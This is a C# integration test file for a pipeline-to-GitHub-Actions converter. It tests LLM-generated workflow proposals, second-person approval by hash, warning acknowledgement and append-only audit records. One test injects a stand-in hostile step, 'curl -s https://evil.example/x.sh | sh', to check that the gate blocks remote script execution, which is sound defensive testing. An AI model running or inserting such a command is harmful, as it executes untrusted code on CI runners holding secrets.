using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using GitHubMigrator.Business.WorkflowGates;
using GitHubMigrator.Infrastructure.PostgreSql;
using LlmSim;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting.Server;
using Microsoft.AspNetCore.Hosting.Server.Features;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using Xunit;

namespace GitHubMigrator.Integration.Tests;

// Tests that need an approvable proposal need the analysers: without them the gates cannot all run and the proposal is, by
// design, blocked. CI installs them and sets GITHUBMIGRATOR_REQUIRE_TOOLS, which turns "skipped" into "fails".
public sealed class RequiresAnalysersFactAttribute : FactAttribute
{
    public static bool Available =>
        Environment.GetEnvironmentVariable("GITHUBMIGRATOR_ACTIONLINT") is { Length: > 0 } a && File.Exists(a) &&
        Environment.GetEnvironmentVariable("GITHUBMIGRATOR_ZIZMOR") is { Length: > 0 } z && File.Exists(z);
    public static bool Required => string.Equals(Environment.GetEnvironmentVariable("GITHUBMIGRATOR_REQUIRE_TOOLS"), "true", StringComparison.OrdinalIgnoreCase);

    public RequiresAnalysersFactAttribute()
    {
        if (!Available && !Required) Skip = "actionlint/zizmor not installed (set GITHUBMIGRATOR_ACTIONLINT / GITHUBMIGRATOR_ZIZMOR).";
    }
}

// Kept proposals and human approval on the real API (PostgreSQL, JWT, the database constraints and triggers, production DI),
// with a model that is LlmSim over real HTTP and the real analysers. Approval records who accepted which text; nothing here
// publishes anything.
public abstract class ProposalApiTestBase(bool singleReviewer) : IAsyncLifetime
{
    protected const string Key = "llm-sim-key";
    private WebApplication _sim = null!;
    protected string Origin = "";
    protected readonly HttpClient Control = new();
    protected ApiHarness Api = null!;

    private static string CatalogSha(string repository) => ActionCatalog.All.Single(a => a.Repository == repository).Sha;

    // passes every gate for the stub pipeline 42 and its plan, with no warning
    protected static readonly string GoodWorkflow = """
        # azure-tasks: converted=UseDotNet@2 manual=none
        name: Release Safe
        on:
          workflow_dispatch:
        permissions:
          contents: read
        env:
          BUILD_REGION: ${{ vars.BUILD_REGION }}
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@@CHECKOUT@ # v7.0.1
                with:
                  persist-credentials: false
              - uses: actions/setup-dotnet@@DOTNET@ # v6.1.0
              - name: Print
                env:
                  DEPLOY_PASSWORD: ${{ secrets.DEPLOY_PASSWORD }}
                run: echo "deploying to $BUILD_REGION"
        """.Replace("@CHECKOUT@", CatalogSha("actions/checkout")).Replace("@DOTNET@", CatalogSha("actions/setup-dotnet"));

    // the same text with a pin this product has not verified: still approvable, with one warning to accept
    protected static readonly string WarningWorkflow = GoodWorkflow.Replace(CatalogSha("actions/setup-dotnet"), new string('a', 40));

    protected static string Fenced(string yaml) => "```yaml\n" + yaml + "\n```\n\nNotes: nothing else.";

    public async Task InitializeAsync()
    {
        _sim = await LlmSimApp.StartAsync(new LlmSimOptions("http://127.0.0.1:0"));
        Origin = _sim.Services.GetRequiredService<IServer>().Features.Get<IServerAddressesFeature>()!.Addresses.First();
        Control.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", Key);
        Api = new ApiHarness { LlmSimOrigin = Origin, SingleReviewer = singleReviewer };
        await Api.InitializeAsync();
        await using var scope = Api.Host.Services.CreateAsyncScope();
        var db = scope.ServiceProvider.GetRequiredService<AppDbContext>();
        await db.AiConnections.ExecuteDeleteAsync();
        await db.ConnectionSecrets.Where(x => x.Reference.StartsWith("ai-connection-")).ExecuteDeleteAsync();
    }

    public async Task DisposeAsync()
    {
        Control.Dispose();
        await Api.DisposeAsync();
        await _sim.StopAsync();
        await _sim.DisposeAsync();
    }

    protected enum Who { Anonymous, User, Admin, Superadmin }

    protected async Task<HttpResponseMessage> SendAsync(HttpMethod method, string url, Who who = Who.Admin, object? body = null)
    {
        var request = new HttpRequestMessage(method, url);
        var token = who switch
        {
            Who.Admin => await Api.LoginAsync(Api.AdminName, ApiHarness.AdminPassword),
            Who.Superadmin => await Api.LoginAsync(Api.SuperadminName, ApiHarness.SuperadminPassword),
            Who.User => await Api.LoginAsync(Api.UserName, ApiHarness.UserPassword),
            _ => null
        };
        if (token is not null) request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
        if (body is not null) request.Content = JsonContent.Create(body);
        return await Api.Client.SendAsync(request);
    }

    protected static async Task<JsonElement> JsonOf(HttpResponseMessage response)
    {
        using var document = JsonDocument.Parse(await response.Content.ReadAsStringAsync());
        return document.RootElement.Clone();
    }

    protected async Task ScriptAsync(params object[] replies) =>
        (await Control.PostAsync(Origin + "/_sim/script", new StringContent(JsonSerializer.Serialize(new { responses = replies }), Encoding.UTF8, "application/json"))).EnsureSuccessStatusCode();

    protected async Task<Guid> AiConnectionAsync(bool consent)
    {
        using var created = await SendAsync(HttpMethod.Post, "/api/ai-connections", body: new
        {
            name = "Model", provider = "OpenAICompatible", endpoint = Origin + "/v1", model = "gpt-sim", auth = "ApiKey", apiKey = Key
        });
        Assert.Equal(HttpStatusCode.Created, created.StatusCode);
        var id = (await JsonOf(created)).GetProperty("id").GetGuid();
        if (consent)
        {
            using var allowed = await SendAsync(HttpMethod.Put, $"/api/ai-connections/{id}/source-consent", Who.Superadmin, new { sendSourceContent = true });
            Assert.Equal(HttpStatusCode.OK, allowed.StatusCode);
        }
        return id;
    }

    // Converts as the administrator and returns the answer of the endpoint.
    protected async Task<JsonElement> ConvertAsync(Guid ai, string workflow, int? maxRepairs = null, Who who = Who.Admin)
    {
        await ScriptAsync(new { content = Fenced(workflow) });
        using var response = await SendAsync(HttpMethod.Post, "/api/workloads/pipelines/convert", who, new
        {
            sourceConnectionId = Api.SourceConnectionId, projectId = "project", pipelineId = 42, aiConnectionId = ai, maxRepairs
        });
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        return await JsonOf(response);
    }

    // What the UI sends: the distinct warning codes shown with the proposal (real zizmor always warns about secrets outside an environment).
    protected static string[] Warned(JsonElement conversion) => conversion.GetProperty("findings").EnumerateArray()
        .Where(f => f.GetProperty("severity").GetString() == "Warning").Select(f => f.GetProperty("code").GetString()!).Distinct().Order(StringComparer.Ordinal).ToArray();

    protected static string Url(JsonElement conversion, string? suffix = null) =>
        $"/api/workloads/pipelines/proposals/{conversion.GetProperty("proposalId").GetGuid()}{suffix}";

    protected async Task<T> InDbAsync<T>(Func<AppDbContext, Task<T>> read)
    {
        await using var scope = Api.Host.Services.CreateAsyncScope();
        return await read(scope.ServiceProvider.GetRequiredService<AppDbContext>());
    }

    protected async Task<JsonElement> ReadyProposalAsync(string? workflow = null)
    {
        var conversion = await ConvertAsync(await AiConnectionAsync(consent: true), workflow ?? GoodWorkflow);
        Assert.True(conversion.GetProperty("approvable").GetBoolean(), "the analysers are not installed: a proposal cannot be approvable without them");
        Assert.Equal("ReadyForReview", conversion.GetProperty("status").GetString());
        return conversion;
    }
}

public sealed class WorkflowProposalApprovalApiTests() : ProposalApiTestBase(singleReviewer: false)
{
    [RequiresAnalysersFact]
    public async Task A_conversion_is_kept_and_a_second_person_approves_the_exact_text_by_its_hash()
    {
        var conversion = await ReadyProposalAsync();
        Assert.True(conversion.GetProperty("saved").GetBoolean());
        Assert.Equal("Proposed", conversion.GetProperty("proposalState").GetString());
        var sha = conversion.GetProperty("workflowSha256").GetString()!;
        var id = conversion.GetProperty("proposalId").GetGuid();

        // kept as written, with its author and the evidence
        var row = await InDbAsync(db => db.WorkflowProposals.AsNoTracking().SingleAsync(x => x.Id == id));
        Assert.Equal("Proposed", row.State);
        Assert.Equal(conversion.GetProperty("workflowYaml").GetString(), row.WorkflowYaml);
        Assert.Equal(GoodWorkflow, row.WorkflowYaml!.TrimEnd());
        Assert.Equal(sha, row.WorkflowSha256);
        Assert.Null(row.ApprovedSha256);
        Assert.Equal(Api.AdminName, row.CreatedBy);
        Assert.DoesNotContain("DONT_SHOW", row.Evidence);
        Assert.DoesNotContain(Key, row.Evidence);

        // listed without the text, read with it
        using var list = await SendAsync(HttpMethod.Get, $"/api/workloads/pipelines/proposals?sourceConnectionId={Api.SourceConnectionId}&projectId=project&pipelineId=42");
        var listed = (await JsonOf(list)).EnumerateArray().Single(e => e.GetProperty("id").GetGuid() == id);
        Assert.Equal("Proposed", listed.GetProperty("state").GetString());
        Assert.False(listed.TryGetProperty("workflowYaml", out _));
        using var asAuthor = await SendAsync(HttpMethod.Get, Url(conversion));
        var authorView = await JsonOf(asAuthor);
        Assert.Equal(row.WorkflowYaml, authorView.GetProperty("workflowYaml").GetString());
        Assert.True(authorView.GetProperty("createdByMe").GetBoolean());
        Assert.True(authorView.GetProperty("requiresSecondApprover").GetBoolean());
        Assert.False(authorView.GetProperty("canApprove").GetBoolean());
        using var asReviewer = await SendAsync(HttpMethod.Get, Url(conversion), Who.Superadmin);
        Assert.True((await JsonOf(asReviewer)).GetProperty("canApprove").GetBoolean());

        // the author cannot approve their own proposal; a wrong hash is not an approval of what was read
        using var self = await SendAsync(HttpMethod.Post, Url(conversion, "/approve"), Who.Admin, new { workflowSha256 = sha });
        Assert.Equal(HttpStatusCode.Forbidden, self.StatusCode);
        Assert.Equal("SecondApproverRequired", (await JsonOf(self)).GetProperty("error").GetString());
        using var wrong = await SendAsync(HttpMethod.Post, Url(conversion, "/approve"), Who.Superadmin, new { workflowSha256 = new string('0', 64) });
        Assert.Equal(HttpStatusCode.Conflict, wrong.StatusCode);
        Assert.Equal("WorkflowHashMismatch", (await JsonOf(wrong)).GetProperty("error").GetString());
        Assert.Equal("Proposed", (await InDbAsync(db => db.WorkflowProposals.AsNoTracking().SingleAsync(x => x.Id == id))).State);

        using var approved = await SendAsync(HttpMethod.Post, Url(conversion, "/approve"), Who.Superadmin, new { workflowSha256 = sha, acknowledgedWarnings = Warned(conversion), note = "Reviewed against the pipeline." });
        Assert.Equal(HttpStatusCode.OK, approved.StatusCode);
        var detail = await JsonOf(approved);
        Assert.Equal("Approved", detail.GetProperty("state").GetString());
        Assert.Equal(sha, detail.GetProperty("approvedSha256").GetString());
        Assert.True(detail.GetProperty("integrityOk").GetBoolean());
        var events = detail.GetProperty("events").EnumerateArray().ToArray();
        Assert.Equal(["Created", "Approved"], events.Select(e => e.GetProperty("type").GetString()));
        Assert.Equal(Api.SuperadminName, events[1].GetProperty("actor").GetString());
        Assert.Equal(sha, events[1].GetProperty("workflowSha256").GetString());
        Assert.Equal("Reviewed against the pipeline.", events[1].GetProperty("note").GetString());
        Assert.Equal(Warned(conversion), events[1].GetProperty("acknowledgedWarnings").EnumerateArray().Select(e => e.GetString()));
        Assert.Equal(64, events[1].GetProperty("reportSha256").GetString()!.Length);
        Assert.Equal(WorkflowGatePolicy.Default.Version, events[1].GetProperty("policyVersion").GetString());

        // decided once
        using var again = await SendAsync(HttpMethod.Post, Url(conversion, "/approve"), Who.Superadmin, new { workflowSha256 = sha });
        Assert.Equal(HttpStatusCode.Conflict, again.StatusCode);
        Assert.Equal("ProposalNotPending", (await JsonOf(again)).GetProperty("error").GetString());

        // revoking needs a reason and keeps what had been approved on record
        using var noReason = await SendAsync(HttpMethod.Post, Url(conversion, "/revoke"), Who.Admin, new { note = "" });
        Assert.Equal(HttpStatusCode.BadRequest, noReason.StatusCode);
        using var revoked = await SendAsync(HttpMethod.Post, Url(conversion, "/revoke"), Who.Admin, new { note = "Found a problem in review." });
        var after = await JsonOf(revoked);
        Assert.Equal("Revoked", after.GetProperty("state").GetString());
        Assert.Equal(sha, after.GetProperty("approvedSha256").GetString());
        Assert.Equal(["Created", "Approved", "Revoked"], after.GetProperty("events").EnumerateArray().Select(e => e.GetProperty("type").GetString()));
    }

    [RequiresAnalysersFact]
    public async Task A_warning_has_to_be_accepted_by_name_and_the_event_records_which()
    {
        var conversion = await ReadyProposalAsync(WarningWorkflow);
        Assert.Contains(conversion.GetProperty("findings").EnumerateArray(), f => f.GetProperty("code").GetString() == "ACTION_PIN_NOT_VERIFIED" && f.GetProperty("severity").GetString() == "Warning");
        var sha = conversion.GetProperty("workflowSha256").GetString()!;

        var all = Warned(conversion);
        Assert.Contains("ACTION_PIN_NOT_VERIFIED", all);

        using var blind = await SendAsync(HttpMethod.Post, Url(conversion, "/approve"), Who.Superadmin, new { workflowSha256 = sha });
        Assert.Equal(HttpStatusCode.UnprocessableEntity, blind.StatusCode);
        var refusal = await JsonOf(blind);
        Assert.Equal("WarningsNotAcknowledged", refusal.GetProperty("error").GetString());
        Assert.Equal(all, refusal.GetProperty("details").EnumerateArray().Select(e => e.GetString()));

        // accepting some is not accepting all: the refusal names what is left
        using var partial = await SendAsync(HttpMethod.Post, Url(conversion, "/approve"), Who.Superadmin,
            new { workflowSha256 = sha, acknowledgedWarnings = new[] { "ACTION_PIN_NOT_VERIFIED" } });
        if (all.Length > 1)
        {
            Assert.Equal(HttpStatusCode.UnprocessableEntity, partial.StatusCode);
            Assert.Equal(all.Where(c => c != "ACTION_PIN_NOT_VERIFIED"), (await JsonOf(partial)).GetProperty("details").EnumerateArray().Select(e => e.GetString()));
        }

        using var accepted = await SendAsync(HttpMethod.Post, Url(conversion, "/approve"), Who.Superadmin,
            new { workflowSha256 = sha, acknowledgedWarnings = all });
        Assert.Equal(HttpStatusCode.OK, accepted.StatusCode);
        var events = (await JsonOf(accepted)).GetProperty("events").EnumerateArray().ToArray();
        Assert.Equal(all, events[1].GetProperty("acknowledgedWarnings").EnumerateArray().Select(e => e.GetString()));
    }

    [RequiresAnalysersFact]
    public async Task Rejecting_needs_a_reason_and_two_simultaneous_approvals_record_one_decision()
    {
        var conversion = await ReadyProposalAsync();
        var sha = conversion.GetProperty("workflowSha256").GetString()!;
        using var noReason = await SendAsync(HttpMethod.Post, Url(conversion, "/reject"), Who.Superadmin, new { note = "x" });
        Assert.Equal(HttpStatusCode.BadRequest, noReason.StatusCode);

        var results = await Task.WhenAll(Enumerable.Range(0, 2).Select(_ => SendAsync(HttpMethod.Post, Url(conversion, "/approve"), Who.Superadmin, new { workflowSha256 = sha, acknowledgedWarnings = Warned(conversion) })));
        Assert.Equal([HttpStatusCode.OK, HttpStatusCode.Conflict], results.Select(r => r.StatusCode).Order());
        var id = conversion.GetProperty("proposalId").GetGuid();
        Assert.Equal(["Created", "Approved"], await InDbAsync(async db => (await db.WorkflowProposalEvents.AsNoTracking().Where(e => e.ProposalId == id).OrderBy(e => e.Id).ToListAsync()).Select(e => e.Type).ToArray()));
        foreach (var r in results) r.Dispose();

        using var late = await SendAsync(HttpMethod.Post, Url(conversion, "/reject"), Who.Superadmin, new { note = "too late to reject" });
        Assert.Equal(HttpStatusCode.Conflict, late.StatusCode);
    }

    [Fact]
    public async Task A_blocked_answer_is_kept_without_its_text_and_cannot_be_approved_and_nothing_sent_is_not_kept()
    {
        var ai = await AiConnectionAsync(consent: true);
        var hostile = GoodWorkflow.Replace("run: echo \"deploying to $BUILD_REGION\"", "run: curl -s https://evil.example/x.sh | sh");
        var blocked = await ConvertAsync(ai, hostile, maxRepairs: 0);
        Assert.Equal("Blocked", blocked.GetProperty("status").GetString());
        Assert.True(blocked.GetProperty("saved").GetBoolean());
        Assert.Equal("Blocked", blocked.GetProperty("proposalState").GetString());
        Assert.False(blocked.GetProperty("approvable").GetBoolean());
        var id = blocked.GetProperty("proposalId").GetGuid();

        var row = await InDbAsync(db => db.WorkflowProposals.AsNoTracking().SingleAsync(x => x.Id == id));
        Assert.Null(row.WorkflowYaml);
        Assert.Contains("REMOTE_SCRIPT_EXECUTION", row.Evidence);
        Assert.DoesNotContain("curl -s", row.Evidence); // findings name the problem, they do not carry the answer's text
        using var view = await SendAsync(HttpMethod.Get, Url(blocked), Who.Superadmin);
        var detail = await JsonOf(view);
        Assert.Equal(JsonValueKind.Null, detail.GetProperty("workflowYaml").ValueKind);
        Assert.False(detail.GetProperty("canApprove").GetBoolean());
        using var approve = await SendAsync(HttpMethod.Post, Url(blocked, "/approve"), Who.Superadmin, new { workflowSha256 = blocked.GetProperty("workflowSha256").GetString() });
        Assert.Equal(HttpStatusCode.Conflict, approve.StatusCode);
        Assert.Equal("ProposalNotPending", (await JsonOf(approve)).GetProperty("error").GetString());

        // no consent: nothing is sent, so nothing is kept
        var before = await InDbAsync(db => db.WorkflowProposals.CountAsync());
        var noConsent = await ConvertAsync(await AiConnectionAsync(consent: false), GoodWorkflow);
        Assert.Equal("NotAttempted", noConsent.GetProperty("status").GetString());
        Assert.False(noConsent.GetProperty("saved").GetBoolean());
        Assert.Equal(JsonValueKind.Null, noConsent.GetProperty("proposalId").ValueKind);
        Assert.Equal(before, await InDbAsync(db => db.WorkflowProposals.CountAsync()));
    }

    [Fact]
    public async Task Access_input_and_unknown_ids_are_handled_before_any_decision()
    {
        var ghost = $"/api/workloads/pipelines/proposals/{Guid.NewGuid()}";
        Assert.Equal(HttpStatusCode.NotFound, (await SendAsync(HttpMethod.Get, ghost)).StatusCode);
        Assert.Equal(HttpStatusCode.NotFound, (await SendAsync(HttpMethod.Post, ghost + "/approve", Who.Superadmin, new { workflowSha256 = new string('a', 64) })).StatusCode);
        Assert.Equal(HttpStatusCode.NotFound, (await SendAsync(HttpMethod.Post, ghost + "/reject", Who.Superadmin, new { note = "no such proposal" })).StatusCode);
        Assert.Equal(HttpStatusCode.Unauthorized, (await SendAsync(HttpMethod.Get, ghost, Who.Anonymous)).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden, (await SendAsync(HttpMethod.Get, ghost, Who.User)).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden, (await SendAsync(HttpMethod.Post, ghost + "/approve", Who.User, new { workflowSha256 = new string('a', 64) })).StatusCode);
        Assert.Equal(HttpStatusCode.BadRequest, (await SendAsync(HttpMethod.Get, $"/api/workloads/pipelines/proposals?sourceConnectionId={Guid.NewGuid()}&projectId=&pipelineId=1")).StatusCode);
        Assert.Equal(HttpStatusCode.BadRequest, (await SendAsync(HttpMethod.Get, $"/api/workloads/pipelines/proposals?sourceConnectionId={Guid.NewGuid()}&projectId=p&pipelineId=0")).StatusCode);
    }

    // What the service enforces, the database enforces too: these statements bypass the service on purpose.
    [RequiresAnalysersFact]
    public async Task The_database_refuses_to_rewrite_a_proposal_skip_a_state_or_edit_a_decision()
    {
        var proposal = await ReadyProposalAsync();
        var id = proposal.GetProperty("proposalId").GetGuid();
        var sha = proposal.GetProperty("workflowSha256").GetString()!;

        async Task<string> RefusedAsync(string sql, params object[] parameters)
        {
            var ex = await Assert.ThrowsAnyAsync<Exception>(() => InDbAsync(db => db.Database.ExecuteSqlRawAsync(sql, parameters)));
            return ex.ToString();
        }

        // text, hash and author are fixed once written
        Assert.Contains("immutable", await RefusedAsync("UPDATE workflow_proposals SET workflow_yaml = 'name: x' WHERE id = {0}", id));
        Assert.Contains("immutable", await RefusedAsync("UPDATE workflow_proposals SET created_by = 'someone-else' WHERE id = {0}", id));
        Assert.Contains("immutable", await RefusedAsync("UPDATE workflow_proposals SET evidence = '{{}}'::jsonb WHERE id = {0}", id));
        // no skipping the human step and no approving something that is not this text
        Assert.Contains("state transition", await RefusedAsync("UPDATE workflow_proposals SET state = 'Revoked', approved_sha256 = workflow_sha256 WHERE id = {0}", id));
        Assert.Contains("ck_workflow_proposals_state", await RefusedAsync("UPDATE workflow_proposals SET state = 'Approved', approved_sha256 = {1} WHERE id = {0}", id, new string('e', 64)));
        Assert.Contains("ck_workflow_proposals_state", await RefusedAsync("UPDATE workflow_proposals SET state = 'Approved' WHERE id = {0}", id));
        Assert.Contains("audit record", await RefusedAsync("DELETE FROM workflow_proposals WHERE id = {0}", id));
        Assert.Equal("Proposed", (await InDbAsync(db => db.WorkflowProposals.AsNoTracking().SingleAsync(x => x.Id == id))).State);

        // an approval cannot be edited, and the history is append-only
        using var approved = await SendAsync(HttpMethod.Post, Url(proposal, "/approve"), Who.Superadmin, new { workflowSha256 = sha, acknowledgedWarnings = Warned(proposal) });
        Assert.Equal(HttpStatusCode.OK, approved.StatusCode);
        Assert.Contains("immutable", await RefusedAsync("UPDATE workflow_proposals SET workflow_sha256 = {1} WHERE id = {0}", id, new string('b', 64)));
        Assert.Contains("cannot be changed", await RefusedAsync("UPDATE workflow_proposals SET approved_sha256 = {1} WHERE id = {0}", id, new string('c', 64)));
        Assert.Contains("state transition", await RefusedAsync("UPDATE workflow_proposals SET state = 'Proposed', approved_sha256 = NULL WHERE id = {0}", id));
        Assert.Contains("append-only", await RefusedAsync("UPDATE workflow_proposal_events SET actor = 'someone-else' WHERE proposal_id = {0}", id));
        Assert.Contains("append-only", await RefusedAsync("DELETE FROM workflow_proposal_events WHERE proposal_id = {0}", id));
        Assert.Contains("ck_workflow_proposal_events_type", await RefusedAsync(
            "INSERT INTO workflow_proposal_events (proposal_id, type, actor_id, actor, occurred_at_utc) VALUES ({0}, 'Approved', {1}, 'x', now())", id, Guid.NewGuid()));
        Assert.Contains("ck_workflow_proposal_events_type", await RefusedAsync(
            "INSERT INTO workflow_proposal_events (proposal_id, type, actor_id, actor, occurred_at_utc, workflow_sha256) VALUES ({0}, 'Revoked', {1}, 'x', now(), {2})", id, Guid.NewGuid(), sha));
        Assert.Equal(2, await InDbAsync(db => db.WorkflowProposalEvents.CountAsync(e => e.ProposalId == id)));
    }
}

public sealed class WorkflowProposalSingleReviewerApiTests() : ProposalApiTestBase(singleReviewer: true)
{
    [RequiresAnalysersFact]
    public async Task A_single_reviewer_deployment_lets_the_author_approve_and_still_records_who()
    {
        var conversion = await ReadyProposalAsync();
        var sha = conversion.GetProperty("workflowSha256").GetString()!;
        using var view = await SendAsync(HttpMethod.Get, Url(conversion));
        var detail = await JsonOf(view);
        Assert.False(detail.GetProperty("requiresSecondApprover").GetBoolean());
        Assert.True(detail.GetProperty("canApprove").GetBoolean());

        using var approved = await SendAsync(HttpMethod.Post, Url(conversion, "/approve"), Who.Admin, new { workflowSha256 = sha, acknowledgedWarnings = Warned(conversion) });
        Assert.Equal(HttpStatusCode.OK, approved.StatusCode);
        var events = (await JsonOf(approved)).GetProperty("events").EnumerateArray().ToArray();
        Assert.Equal([Api.AdminName, Api.AdminName], events.Select(e => e.GetProperty("actor").GetString()));
    }
}
